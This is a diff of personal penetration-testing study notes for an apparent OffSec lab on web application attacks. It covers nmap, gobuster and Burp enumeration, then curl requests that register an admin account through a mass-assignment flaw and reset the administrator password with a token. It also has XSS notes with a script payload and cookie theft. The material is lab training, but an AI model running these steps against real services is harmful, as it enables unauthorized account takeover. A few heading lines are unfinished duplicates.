@@ -251,16 +251,16 @@
 9. Introduction to web applcation attacks
    - Fingerprinting Web Servers with Nmap
      `sudo nmap -p80 -sV 192.168.50.20`: grab the web server banner
-     `sudo nmap -p80 --script=http-enum 192.168.50.20`: fingerprint web server
+     `sudo nmap -p80 --script=http-enum 192.168.50.20`: NSE enum web server (pages discovery)
    - [Wappalyzer](https://www.wappalyzer.com/): technology stack
    - [Gobuster](https://www.kali.org/tools/gobuster/): wordlists to discover directories and files
      `gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t5`  
    - Burp Suite
      - Only http traffic, no cert install_, enable_intercept(forward or drop), proxy listerner on localhost:8080
      - Browser proxy setting: about:preferences#general > settings > networks setting > http proxy (host 127.0.0.1,port 8080 + use this proxy for HTTPS) & SOCKSv4 (host 127.0.0.1, port 9060)
-   - Burp Suite intercept, repeater (send request), intruder (brute force attack in $position)
-   - URL file extension, Debug page content (browser web developer tool + pretty print + inspector tool)
-   - inspect HTTP response headers and sitemaps in browser web developer tool >network tab
+   - Burp Suite intercept, proxy > HTTP history > send to repeater (send request), intruder (brute force attack in $position)
+   - URL file extension, Debug page content (browser tool 'debugger' + pretty print + inspector tool)
+   - inspect HTTP response headers and sitemaps (browser tool 'network')
    - sitemaps `curl https://www.google.com/robots.txt`
    - Gobuster: enumerate APIs  
      **pattern file**  
@@ -268,26 +268,35 @@
      {GOBUSTER}/v2  
   
      ```
-     gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
-     
-     curl -i http://192.168.50.16:5002/users/v1
-     
-     gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
-     
-     curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json http://192.168.50.16:5002/users/v1/login
+     gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern: brute force API paths
+     curl -i http://192.168.50.16:5002/users/v1: obtain user info
+     gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt: discover extra APIs
+     curl -i http://192.168.50.16:5002/users/v1/admin/password: probe API > unsupported method
+     curl -i http://192.168.50.16:5002/users/v1/login: inspect 'login' API > user not found
+     curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json http://192.168.50.16:5002/users/v1/login: POST request > password is not correct for the given username
+     curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register: Register > email required  
+     curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register: POST request register success
+     curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type:application/json' http://192.168.50.16:5002/users/v1/login: login as admin > token received
 
-     curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
-
-     curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register  
-
-     curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type:application/json' http://192.168.50.16:5002/users/v1/login
-
+     Change the Administrator Password
      curl -X 'PUT' \
       'http://192.168.50.16:5002/users/v1/admin/password' \
       -H 'Content-Type: application/json' \
       -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb IHbJI7f9KaRAkrywoaRUAsgA4' \
       -d '{"password": "pwned"}'
       ```
+
+    - Cross-site scripting  
+      - reflected: payload in a crafted request or link. search field or user input included in error messages. 
+      - stored/persistent: exploit payload is stored in a database. web application then retrieves this payload and displays it to anyone who visits a vulnerable page. forum comment, product review.  
+      - DOM-based: page’s DOM is modified with user-controlled values  
+      - identify XSS: input accepts unsanitized input `< > ' " { } ;`. URL encoding (space-%20) & HTML encoding (\-&lt;) interprete as code  
+      - User-Agent `<script>alert(1)</script>`  
+      - privilege escalation: steal cookies. protection (secure-send cookier over https.httpOnly-deny js access to cookies). browser tool 'Storage>Cookies'
+    - Cross-site scripting
+    - Cross-site scripting
+    - Cross-site scripting
+    
     
 10. Common Web Application attacks
     - **Directory traversal**: access files outside of the web root by using relative paths
